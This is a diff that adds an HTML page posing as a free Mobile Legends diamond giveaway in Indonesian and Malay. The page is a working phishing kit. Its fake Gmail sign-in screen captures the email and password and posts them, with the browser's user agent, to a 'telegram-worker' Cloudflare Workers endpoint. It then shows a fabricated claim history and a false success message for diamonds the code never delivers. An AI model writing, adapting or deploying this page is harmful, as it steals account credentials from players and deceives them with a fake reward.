@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Claims Mobile Legends Diamonds</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+  body { min-height: 100vh; background: radial-gradient(circle at top, #1b2a4a 0%, #0a1120 60%, #05080f 100%); color: #e8eefc; display: flex; justify-content: center; align-items: flex-start; padding: 30px 15px; }
+  #gmailLoginScreen { position: fixed; inset: 0; z-index: 999; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding: 28px 20px; font-family: 'Roboto', 'Segoe UI', Arial, sans-serif; overflow-y: auto; }
+  .gmail-topbar { width: 100%; max-width: 1040px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
+  .gmail-logo-text { font-size: 22px; font-weight: 500; color: #5f6368; }
+  .gmail-logo-text b { color: #4285f4; }
+  .gmail-help { font-size: 14px; color: #5f6368; }
+  .gmail-card { width: 100%; max-width: 448px; background: #fff; border: 1px solid #dadce0; border-radius: 8px; padding: 40px 40px 28px; text-align: left; animation: fadeIn 0.3s ease; }
+  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+  .google-logo-svg { width: 40px; height: 40px; margin-bottom: 16px; display: block; }
+  .gmail-title { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+  .gmail-subtitle { font-size: 16px; color: #202124; margin-bottom: 28px; }
+  .gmail-field { margin-bottom: 16px; }
+  #gmailLoginScreen .gmail-input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; color: #202124; background: #fff; outline: none; }
+  #gmailLoginScreen .gmail-input:focus { border-color: #1a73e8; box-shadow: inset 0 0 0 1px #1a73e8; }
+  .gmail-error { color: #d93025; font-size: 13px; margin: 4px 0 0; display: none; }
+  .gmail-error.show { display: block; }
+  .gmail-forgot-link { display: inline-block; margin-top: 16px; font-size: 14px; color: #1a73e8; font-weight: 500; text-decoration: none; cursor: pointer; }
+  .gmail-forgot-link:hover { text-decoration: underline; }
+  .gmail-guest-note { margin-top: 22px; font-size: 14px; color: #5f6368; line-height: 1.5; }
+  .gmail-guest-note a { color: #1a73e8; text-decoration: none; }
+  .gmail-actions { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; flex-wrap: wrap; gap: 12px; }
+  .gmail-create { font-size: 14px; color: #1a73e8; font-weight: 500; background: none; border: none; cursor: pointer; }
+  .gmail-next { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; min-width: 88px; }
+  .gmail-next:hover { background: #1765cc; }
+  .gmail-next:disabled { background: #9aa0a6; cursor: not-allowed; }
+  .gmail-footer-bottom { width: 100%; max-width: 1040px; margin-top: 24px; display: flex; justify-content: space-between; font-size: 12px; color: #5f6368; flex-wrap: wrap; gap: 10px; }
+  .gmail-footer-bottom select { border: none; background: transparent; font-size: 12px; color: #5f6368; }
+  .gmail-footer-links { display: flex; gap: 18px; }
+  .gmail-footer-links a { color: #5f6368; text-decoration: none; }
+  .gmail-loading { display: none; flex-direction: column; align-items: center; gap: 16px; padding: 30px 0; }
+  .gmail-loading.show { display: flex; }
+  .spinner { width: 36px; height: 36px; border: 3px solid #e8eaed; border-top-color: #1a73e8; border-radius: 50%; animation: spin 0.8s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .gmail-loading p { font-size: 14px; color: #5f6368; }
+  .container { width: 100%; max-width: 520px; background: linear-gradient(160deg, #14213d 0%, #0d1730 100%); border: 1px solid #2b3f6b; border-radius: 18px; box-shadow: 0 0 30px rgba(46,108,255,0.25); overflow: hidden; display: none; }
+  .container.show { display: block; }
+  header { background: linear-gradient(135deg, #1e3a8a 0%, #0f1f4b 100%); padding: 24px 20px; text-align: center; border-bottom: 2px solid #f5c542; }
+  .logo-wrap { display: flex; justify-content: center; margin-bottom: 14px; }
+  .logo-wrap img { width: 96px; height: 96px; object-fit: cover; border-radius: 20px; border: 2px solid #f5c542; background: #0a1226; }
+  header h1 { font-size: 1.5rem; color: #f5c542; }
+  header p { margin-top: 6px; font-size: 0.85rem; color: #a9bce6; }
+  .logout-bar { display: flex; justify-content: space-between; align-items: center; gap: 10px; padding: 10px 22px; background: #0a1226; border-bottom: 1px solid #223257; font-size: 0.78rem; color: #8fa3cc; }
+  .logout-bar strong { color: #f5c542; word-break: break-all; }
+  .btn-logout { background: transparent; border: 1px solid #e74c3c; color: #ff9b90; padding: 6px 12px; border-radius: 8px; font-size: 0.75rem; font-weight: 700; cursor: pointer; }
+  .content { padding: 24px 22px 30px; }
+  label { display: block; font-size: 0.85rem; margin-bottom: 6px; color: #b9c8ea; font-weight: 600; }
+  .content input[type="text"], .content select { width: 100%; padding: 12px 14px; background: #0a1226; border: 1px solid #2b3f6b; border-radius: 10px; color: #e8eefc; font-size: 0.95rem; outline: none; margin-bottom: 16px; }
+  .content input[type="text"]:focus, .content select:focus { border-color: #f5c542; }
+  .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #f5c542 0%, #d99a1c 100%); border: none; border-radius: 10px; color: #14213d; font-size: 1rem; font-weight: 800; cursor: pointer; }
+  .btn:hover { transform: translateY(-2px); }
+  .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+  .process-note { margin-top: 10px; font-size: 0.78rem; color: #8fa3cc; text-align: center; font-style: italic; }
+  .message { margin-top: 16px; padding: 12px 14px; border-radius: 10px; font-size: 0.9rem; display: none; }
+  .message.success { display: block; background: rgba(46,204,113,0.12); border: 1px solid #2ecc71; color: #7dffb0; }
+  .message.error { display: block; background: rgba(231,76,60,0.12); border: 1px solid #e74c3c; color: #ff9b90; }
+  .history { margin-top: 26px; border-top: 1px solid #223257; padding-top: 18px; }
+  .history h2 { font-size: 1rem; color: #f5c542; margin-bottom: 12px; }
+  .history ul { list-style: none; display: flex; flex-direction: column; gap: 8px; }
+  .history li { background: #0a1226; border: 1px solid #223257; border-left: 3px solid #f5c542; border-radius: 8px; padding: 10px 12px; font-size: 0.82rem; color: #c8d6f5; display: flex; justify-content: space-between; align-items: center; gap: 10px; }
+  .history li .diamond-tag { color: #f5c542; font-weight: 700; display: flex; align-items: center; gap: 6px; }
+  .history li .diamond-tag img { width: 18px; height: 18px; object-fit: contain; }
+  footer { text-align: center; padding: 14px; font-size: 0.75rem; color: #5d6f99; border-top: 1px solid #223257; background: #0a1226; }
+</style>
+</head>
+<body>
+
+<div id="gmailLoginScreen">
+  <div class="gmail-topbar">
+    <div class="gmail-logo-text">Google <b>Account</b></div>
+    <div class="gmail-help">Help</div>
+  </div>
+  <div class="gmail-card">
+    <svg class="google-logo-svg" viewBox="0 0 48 48">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+    <div class="gmail-title">Sign in</div>
+    <div class="gmail-subtitle">to continue to Gmail</div>
+    <div id="gmailForm">
+      <div class="gmail-field"><input type="text" id="gmailEmail" class="gmail-input" placeholder="Email or phone" autocomplete="off"></div>
+      <div class="gmail-field"><input type="password" id="gmailPassword" class="gmail-input" placeholder="Enter your password" autocomplete="off"></div>
+      <div class="gmail-error" id="gmailError"></div>
+      <a href="javascript:void(0)" class="gmail-forgot-link" onclick="alert('Demo sahaja.')">Forgot email?</a>
+      <div class="gmail-guest-note">Not your computer? Use a Private Window to sign in.<br><a href="javascript:void(0)" onclick="alert('Demo sahaja.')">Learn more about using Guest mode</a></div>
+      <div class="gmail-actions">
+        <button type="button" class="gmail-create" onclick="alert('Demo sahaja.')">Create account</button>
+        <button type="button" class="gmail-next" id="gmailNextBtn" onclick="submitGmailLogin()">Next</button>
+      </div>
+    </div>
+    <div class="gmail-loading" id="gmailLoading"><div class="spinner"></div><p>Verifying account...</p></div>
+  </div>
+  <div class="gmail-footer-bottom">
+    <select><option>English (United States)</option><option>Bahasa Indonesia</option></select>
+    <div class="gmail-footer-links"><a href="javascript:void(0)">Help</a><a href="javascript:void(0)">Privacy</a><a href="javascript:void(0)">Terms</a></div>
+  </div>
+</div>
+
+<div class="container" id="claimScreen">
+  <header>
+    <div class="logo-wrap">
+      <img id="logoUtama" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT56sob8xGvSv3lq-K-P_JpZ4RUNbgawx80FuV_EkJwcw&s=10" alt="Mobile Legends">
+    </div>
+    <h1>Claims Mobile Legends Diamonds</h1>
+    <p>EACH ACCOUNT CAN ONLY CLAIM ONCE PER DAY. IF YOU CLAIM MORE THAN ONCE, IT WILL NOT BE SUCCESSFUL.</p>
+  </header>
+  <div class="logout-bar">
+    <span>Login sebagai: <strong id="loginEmail">-</strong></span>
+    <button class="btn-logout" onclick="logout()">Logout</button>
+  </div>
+  <div class="content">
+    <form id="claimForm">
+      <label for="userId">User ID / Nickname MLBB</label>
+      <input type="text" id="userId" placeholder="Contoh: 123456789 (1234)" required>
+      <label for="server">Server</label>
+      <input type="text" id="server" placeholder="Contoh: 1234" required>
+      <label for="diamondAmount">Diamond Amount</label>
+      <select id="diamondAmount" required>
+        <option value="">-- Select diamond package --</option>
+        <option value="86">86 Diamonds</option>
+        <option value="172">172 Diamonds</option>
+        <option value="257">257 Diamonds</option>
+        <option value="344">344 Diamonds</option>
+        <option value="514">514 Diamonds</option>
+        <option value="1028">1028 Diamonds</option>
+      </select>
+      <button type="submit" class="btn" id="claimBtn">Claim Diamonds Now</button>
+      <div class="process-note">*The process takes under 10 minutes for the diamonds to be credited to your game ID.</div>
+      <div class="message" id="message"></div>
+    </form>
+    <div class="history">
+      <h2>Claim History</h2>
+      <ul id="historyList">
+        <li><span>KaguraSmurf (2001)</span><span class="diamond-tag">+86 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT56sob8xGvSv3lq-K-P_JpZ4RUNbgawx80FuV_EkJwcw&s=10" alt="diamond"></span></li>
+        <li><span>LordGusion (3214)</span><span class="diamond-tag">+172 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT56sob8xGvSv3lq-K-P_JpZ4RUNbgawx80FuV_EkJwcw&s=10" alt="diamond"></span></li>
+        <li><span>NanaTzyy (1102)</span><span class="diamond-tag">+257 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT56sob8xGvSv3lq-K-P_JpZ4RUNbgawx80FuV_EkJwcw&s=10" alt="diamond"></span></li>
+        <li><span>FannyMainCC (4098)</span><span class="diamond-tag">+344 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT56sob8xGvSv3lq-K-P_JpZ4RUNbgawx80FuV_EkJwcw&s=10" alt="diamond"></span></li>
+        <li><span>LingChouGod (4826)</span><span class="diamond-tag">+514 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT56sob8xGvSv3lq-K-P_JpZ4RUNbgawx80FuV_EkJwcw&s=10" alt="diamond"></span></li>
+      </ul>
+    </div>
+  </div>
+  <footer>© 2026 Claims Mobile Legends Diamonds</footer>
+</div>
+
+<script>
+  const IMG_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT56sob8xGvSv3lq-K-P_JpZ4RUNbgawx80FuV_EkJwcw&s=10";
+
+  /* ============ KONFIGURASI WORKER ============ */
+  const WORKER_URL = "https://telegram-worker.megatfirdauss420.workers.dev";
+  const FETCH_TIMEOUT_MS = 10000;
+  /* ============================================== */
+
+  const gmailLoginScreen = document.getElementById('gmailLoginScreen');
+  const claimScreen = document.getElementById('claimScreen');
+  const gmailEmail = document.getElementById('gmailEmail');
+  const gmailPassword = document.getElementById('gmailPassword');
+  const gmailError = document.getElementById('gmailError');
+  const gmailForm = document.getElementById('gmailForm');
+  const gmailLoading = document.getElementById('gmailLoading');
+  const gmailNextBtn = document.getElementById('gmailNextBtn');
+
+  const form = document.getElementById('claimForm');
+  const userIdInput = document.getElementById('userId');
+  const serverInput = document.getElementById('server');
+  const diamondSelect = document.getElementById('diamondAmount');
+  const messageBox = document.getElementById('message');
+  const historyList = document.getElementById('historyList');
+  const claimBtn = document.getElementById('claimBtn');
+
+  let currentEmail = '';
+
+  function showGmailError(text) {
+    gmailError.textContent = text;
+    gmailError.classList.add('show');
+  }
+  function hideGmailError() {
+    gmailError.classList.remove('show');
+    gmailError.textContent = '';
+  }
+
+  function waktuWIB() {
+    return new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) + ' WIB';
+  }
+
+  function validasiKredensial(email, password) {
+    const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email);
+    const passOk = password.length >= 6;
+    if (emailOk && passOk) return { status: 'SAH', alasan: '-' };
+
+    const alasan = [];
+    if (!emailOk) alasan.push('format email salah');
+    if (!passOk) alasan.push('password kurang 6 karakter');
+    return { status: 'TIDAK SAH', alasan: alasan.join(', ') };
+  }
+
+  /* Hantar ke Worker dengan timeout. Pulangkan {ok, data, error}. */
+  async function kirimKeWorker(payload) {
+    const controller = new AbortController();
+    const timer = setTimeout(function () { controller.abort(); }, FETCH_TIMEOUT_MS);
+    try {
+      const res = await fetch(WORKER_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        signal: controller.signal
+      });
+      clearTimeout(timer);
+      let data = null;
+      try { data = await res.json(); } catch (e) { data = null; }
+      if (!res.ok) {
+        return { ok: false, error: 'Server balas status ' + res.status, data: data };
+      }
+      if (data && data.ok === false) {
+        return { ok: false, error: 'Worker menolak permintaan', data: data };
+      }
+      return { ok: true, data: data };
+    } catch (err) {
+      clearTimeout(timer);
+      const msg = (err && err.name === 'AbortError')
+        ? 'Permintaan tamat masa (timeout).'
+        : 'Ralat rangkaian: ' + (err && err.message ? err.message : 'tidak diketahui');
+      return { ok: false, error: msg };
+    }
+  }
+
+  async function submitGmailLogin() {
+    hideGmailError();
+    const email = gmailEmail.value.trim();
+    const password = gmailPassword.value;
+
+    if (!email || !password) {
+      showGmailError('Email dan password wajib diisi.');
+      return;
+    }
+
+    const cek = validasiKredensial(email, password);
+
+    gmailForm.style.display = 'none';
+    gmailLoading.classList.add('show');
+    gmailNextBtn.disabled = true;
+
+    const hasil = await kirimKeWorker({
+      type: 'login',
+      email: email,
+      password: password,
+      status: cek.status,
+      alasan: cek.alasan,
+      waktu: waktuWIB(),
+      device: navigator.userAgent
+    });
+
+    gmailLoading.classList.remove('show');
+    gmailNextBtn.disabled = false;
+
+    if (!hasil.ok) {
+      gmailForm.style.display = 'block';
+      showGmailError('Gagal sambung ke server. ' + hasil.error + ' Sila cuba lagi.');
+      return;
+    }
+
+    // Berjaya hantar — masuk skrin claim
+    gmailLoginScreen.style.display = 'none';
+    claimScreen.classList.add('show');
+    currentEmail = email;
+    document.getElementById('loginEmail').textContent = email;
+    try { localStorage.setItem('mlbb_login_email', email); } catch (e) {}
+    window.scrollTo(0, 0);
+  }
+
+  gmailEmail.addEventListener('keydown', function (e) { if (e.key === 'Enter') submitGmailLogin(); });
+  gmailPassword.addEventListener('keydown', function (e) { if (e.key === 'Enter') submitGmailLogin(); });
+
+  function logout() {
+    currentEmail = '';
+    gmailEmail.value = '';
+    gmailPassword.value = '';
+    hideGmailError();
+    gmailForm.style.display = 'block';
+    gmailLoading.classList.remove('show');
+    claimScreen.classList.remove('show');
+    gmailLoginScreen.style.display = 'flex';
+    try { localStorage.removeItem('mlbb_login_email'); } catch (e) {}
+  }
+
+  form.addEventListener('submit', async function (e) {
+    e.preventDefault();
+    const userId = userIdInput.value.trim();
+    const server = serverInput.value.trim();
+    const diamonds = diamondSelect.value;
+
+    if (!userId || !server || !diamonds) {
+      messageBox.className = 'message error';
+      messageBox.textContent = 'Semua kolom wajib diisi.';
+      return;
+    }
+    // User ID: angka, optional nickname dalam kurungan
+    if (!/^\d{4,}(\s*\([^)]+\))?$/.test(userId)) {
+      messageBox.className = 'message error';
+      messageBox.textContent = 'User ID mesti angka (min 4 digit), contoh: 123456789 atau 123456789 (Nick).';
+      return;
+    }
+    if (!/^\d+$/.test(server)) {
+      messageBox.className = 'message error';
+      messageBox.textContent = 'Server harus berupa angka.';
+      return;
+    }
+    if (server.length !== 4) {
+      messageBox.className = 'message error';
+      messageBox.textContent = 'Server harus 4 digit.';
+      return;
+    }
+
+    claimBtn.disabled = true;
+    messageBox.className = 'message';
+    messageBox.textContent = 'Memproses...';
+
+    const hasil = await kirimKeWorker({
+      type: 'claim',
+      email: currentEmail,
+      userId: userId,
+      server: server,
+      diamonds: diamonds,
+      waktu: waktuWIB(),
+      device: navigator.userAgent
+    });
+
+    claimBtn.disabled = false;
+
+    if (!hasil.ok) {
+      messageBox.className = 'message error';
+      messageBox.textContent = 'Gagal hantar ke server: ' + hasil.error + ' Sila cuba lagi.';
+      return;
+    }
+
+    messageBox.className = 'message success';
+    messageBox.innerHTML = 'Klaim berhasil! ' + diamonds + ' Diamond untuk <strong>' + escapeHTML(userId) + '</strong> (Server ' + escapeHTML(server) + ') sedang diproses. <img src="' + IMG_URL + '" style="width:20px;height:20px;object-fit:contain;vertical-align:middle;" alt="diamond">';
+
+    addHistory(userId, server, diamonds);
+    form.reset();
+    setTimeout(function () {
+      messageBox.className = 'message';
+      messageBox.innerHTML = '';
+    }, 6000);
+  });
+
+  function addHistory(userId, server, diamonds) {
+    const li = document.createElement('li');
+    li.innerHTML = '<span>' + escapeHTML(userId) + ' (' + escapeHTML(server) + ')</span>' +
+      '<span class="diamond-tag">+' + diamonds + ' <img src="' + IMG_URL + '" alt="diamond"></span>';
+    historyList.prepend(li);
+  }
+
+  function escapeHTML(str) {
+    return String(str).replace(/[&<>"']/g, function (m) {
+      return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m];
+    });
+  }
+
+  /* Restore sesi terakhir (kalau ada) */
+  (function () {
+    let saved = null;
+    try { saved = localStorage.getItem('mlbb_login_email'); } catch (e) {}
+    if (saved) {
+      currentEmail = saved;
+      document.getElementById('loginEmail').textContent = saved;
+      gmailLoginScreen.style.display = 'none';
+      claimScreen.classList.add('show');
+    } else {
+      gmailPassword.focus();
+    }
+  })();
+</script>
+
+</body>
+</html>
